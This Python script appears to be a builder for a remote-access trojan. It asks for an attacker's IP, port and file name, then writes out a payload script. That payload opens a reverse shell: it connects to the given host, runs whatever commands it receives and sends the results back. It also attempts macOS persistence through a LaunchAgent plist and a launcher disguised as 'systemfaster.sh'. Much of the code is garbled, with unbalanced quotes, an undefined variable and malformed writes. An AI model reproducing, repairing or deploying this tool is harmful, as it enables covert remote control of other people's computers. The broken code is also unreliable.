import os
ip = input("Enter IP: ")
a = '"'
port = int(input("Enter port: "))
NAME = input("Enter name of script: ")
other_python_script = f"""
import socket
import subprocess
import os
p = os.path.realpath(__file__)
setsidrat = ("setsid python3", p)
with open("systemfaster.sh", " w") as python_script_file:
    python_script_file.write(setsidrat)
daemon = ("<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.exampled</string>
    <key>LaunchOnlyOnce</key>
        <true/>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>absolute_path_to_script</string>

    </array>
</dict>
</plist>")
with open("com.example.exampld.plist", "w") as python_script_file:
    python_script_file.write(l)
os.system("Library/LaunchAgents/com.example.exampld.plist")
SERVER_HOST = {a+ip+a}
SERVER_PORT = {port}
BUFFER_SIZE = 1024")
# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
# close client connection
s.close()
"""
la = os.path.dirname(__file__)
fName = os.path.join(la,"builds",NAME)
with open(fName, "w") as python_script_file:
    python_script_file.write(other_python_script)
